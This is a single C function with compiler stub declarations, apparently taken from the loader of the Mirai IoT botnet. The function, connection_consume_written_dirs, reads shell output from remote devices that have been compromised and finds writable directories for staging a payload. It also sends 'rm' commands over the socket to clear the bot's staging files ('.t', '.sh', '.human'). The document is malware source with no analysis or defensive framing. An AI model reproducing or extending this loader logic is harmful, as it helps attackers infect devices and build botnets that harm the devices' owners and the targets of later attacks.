#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  writedir; } ;
struct connection {int rdbuf_pos; TYPE_1__ info; int /*<<< orphan*/  fd; scalar_t__ rdbuf; } ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 scalar_t__ FALSE ; 
 char* TOKEN_RESPONSE ; 
 scalar_t__ TRUE ; 
 char* VERIFY_STRING_CHECK ; 
 int /*<<< orphan*/  connection_close (struct connection*) ; 
 int /*<<< orphan*/  strcpy (int /*<<< orphan*/ ,char*) ; 
 int strlen (char*) ; 
 char* strtok (scalar_t__,char*) ; 
 int util_memsearch (scalar_t__,int,char*,int) ; 
 int /*<<< orphan*/  util_sockprintf (int /*<<< orphan*/ ,char*,char*,char*,char*) ; 

int connection_consume_written_dirs(struct connection *conn)
{
    int end_pos, i, offset, total_offset = 0;
    BOOL found_writeable = FALSE;

    if ((end_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE))) == -1)
        return 0;

    while (TRUE)
    {
        char *pch;
        int pch_len;

        offset = util_memsearch(conn->rdbuf + total_offset, end_pos - total_offset, VERIFY_STRING_CHECK, strlen(VERIFY_STRING_CHECK));
        if (offset == -1)
            break;
        total_offset += offset;

        pch = strtok(conn->rdbuf + total_offset, "\n");
        if (pch == NULL)
            continue;
        pch_len = strlen(pch);

        if (pch[pch_len - 1] == '\r')
            pch[pch_len - 1] = 0;

        util_sockprintf(conn->fd, "rm %s/.t; rm %s/.sh; rm %s/.human\r\n", pch, pch, pch);
        if (!found_writeable)
        {
            if (pch_len < 31)
            {
                strcpy(conn->info.writedir, pch);
                found_writeable = TRUE;
            }
            else
                connection_close(conn);
        }
    }

    return end_pos;
}